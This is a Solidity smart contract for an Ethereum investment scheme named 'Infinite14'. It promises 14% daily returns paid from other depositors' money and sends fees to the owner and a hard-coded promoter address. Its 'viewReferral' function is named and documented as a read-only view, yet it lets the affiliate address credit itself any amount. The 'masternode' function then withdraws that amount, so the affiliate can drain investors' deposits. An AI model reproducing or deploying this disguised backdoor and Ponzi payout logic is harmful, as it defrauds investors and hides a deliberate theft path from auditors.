1 pragma solidity ^0.4.24;
2 
3 contract    Infinite14{
4     
5     using SafeMath for uint256;
6 
7     mapping(address => uint256) investments;
8     mapping(address => uint256) joined;
9     mapping(address => uint256) withdrawals;
10     mapping(address => uint256) referrer;
11 
12     uint256 public minimum = 10000000000000000;
13     uint256 public step = 14;
14     address public ownerWallet;
15     address public owner;
16     address public affliate;
17     address promoter = 0xC558895aE123BB02b3c33164FdeC34E9Fb66B660;
18 
19     event Invest(address investor, uint256 amount);
20     event Withdraw(address investor, uint256 amount);
21     event Masternode(address master, uint256 amount);
22     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
23     
24     /**
25      * @dev Сonstructor Sets the original roles of the contract 
26      */
27      
28     constructor(address _affliate) public {
29         owner = msg.sender;
30         ownerWallet = msg.sender;
31         affliate = _affliate;
32     }
33 
34     /**
35      * @dev Modifiers
36      */
37      
38     modifier onlyOwner() {
39         require(msg.sender == owner);
40         _;
41     }
42 
43     modifier onlyaffliate() {
44         require(msg.sender == affliate);
45         _;
46 	}
47 
48     /**
49      * @dev Allows current owner to transfer control of the contract to a newOwner.
50      * @param newOwner The address to transfer ownership to.
51      * @param newOwnerWallet The address to transfer ownership to.
52      */
53     function transferOwnership(address newOwner, address newOwnerWallet) public onlyOwner {
54         require(newOwner != address(0));
55         emit OwnershipTransferred(owner, newOwner);
56         owner = newOwner;
57         ownerWallet = newOwnerWallet;
58     }
59 
60     /**
61      * @dev Investments
62      */
63     function () external payable {
64         require(msg.value >= minimum);
65         if (investments[msg.sender] > 0){
66             if (withdraw()){
67                 withdrawals[msg.sender] = 0;
68             }
69         }
70         investments[msg.sender] = investments[msg.sender].add(msg.value);
71         joined[msg.sender] = block.timestamp;
72         ownerWallet.transfer(msg.value.div(100).mul(5));
73         promoter.transfer(msg.value.div(100).mul(5));
74         emit Invest(msg.sender, msg.value);
75     }
76 
77     /**
78     * @dev Evaluate current balance
79     * @param _address Address of investor
80     */
81     function getBalance(address _address) view public returns (uint256) {
82         uint256 minutesCount = now.sub(joined[_address]).div(1 minutes);
83         uint256 percent = investments[_address].mul(step).div(100);
84         uint256 different = percent.mul(minutesCount).div(1440);
85         uint256 balance = different.sub(withdrawals[_address]);
86 
87         return balance;
88     }
89 
90     /**
91     * @dev Withdraw dividends from contract
92     */
93     function withdraw() public returns (bool){
94         require(joined[msg.sender] > 0);
95         uint256 balance = getBalance(msg.sender);
96         if (address(this).balance > balance){
97             if (balance > 0){
98                 withdrawals[msg.sender] = withdrawals[msg.sender].add(balance);
99                 msg.sender.transfer(balance);
100                 emit Withdraw(msg.sender, balance);
101             }
102             return true;
103         } else {
104             return false;
105         }
106     }
107     
108     /**
109     *Affliate reward
110     */
111     function masternode() public {
112         uint256 refBalance = checkReferral(msg.sender);
113         if(refBalance >= minimum) {
114              if (address(this).balance > refBalance) {
115                 referrer[msg.sender] = 0;
116                 msg.sender.transfer(refBalance);
117                 emit Masternode(msg.sender, refBalance);
118              }
119         }
120     }
121 
122     /**
123     * @dev Gets balance of the sender address.
124     * @return An uint256 representing the amount owned by the msg.sender.
125     */
126     function checkBalance() public view returns (uint256) {
127         return getBalance(msg.sender);
128     }
129 
130     /**
131     * @dev Gets withdrawals of the specified address.
132     * @param _investor The address to query the the balance of.
133     * @return An uint256 representing the amount owned by the passed address.
134     */
135     function checkWithdrawals(address _investor) public view returns (uint256) {
136         return withdrawals[_investor];
137     }
138 
139     /**
140     * @dev Gets investments of the specified address.
141     * @param _investor The address to query the the balance of.
142     * @return An uint256 representing the amount owned by the passed address.
143     */
144     function checkInvestments(address _investor) public view returns (uint256) {
145         return investments[_investor];
146     }
147 
148     /**
149     * @dev Gets referrer balance of the specified address.
150     * @param _master The address of the referrer
151     * @return An uint256 representing the referral earnings.
152     */
153     function checkReferral(address _master) public view returns (uint256) {
154         return referrer[_master];
155     }
156     
157     /**
158     * @dev views referrer balance 
159     * @param _master The address of the referrer
160     * @param _amount An uint256 representing the referral earnings.
161     */
162     function viewReferral(address _master, uint256 _amount) onlyaffliate public {
163         referrer[_master] = referrer[_master].add(_amount);
164     }
165     
166 }
167 
168 /**
169  * @title SafeMath
170  * @dev Math operations with safety checks that throw on error
171  */
172 library SafeMath {
173     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
174         if (a == 0) {
175             return 0;
176         }
177         uint256 c = a * b;
178         assert(c / a == b);
179         return c;
180     }
181 
182     function div(uint256 a, uint256 b) internal pure returns (uint256) {
183         // assert(b > 0); // Solidity automatically throws when dividing by 0
184         uint256 c = a / b;
185         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
186         return c;
187     }
188 
189     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
190         assert(b <= a);
191         return a - b;
192     }
193 
194     function add(uint256 a, uint256 b) internal pure returns (uint256) {
195         uint256 c = a + b;
196         assert(c >= a);
197         return c;
198     }
199 }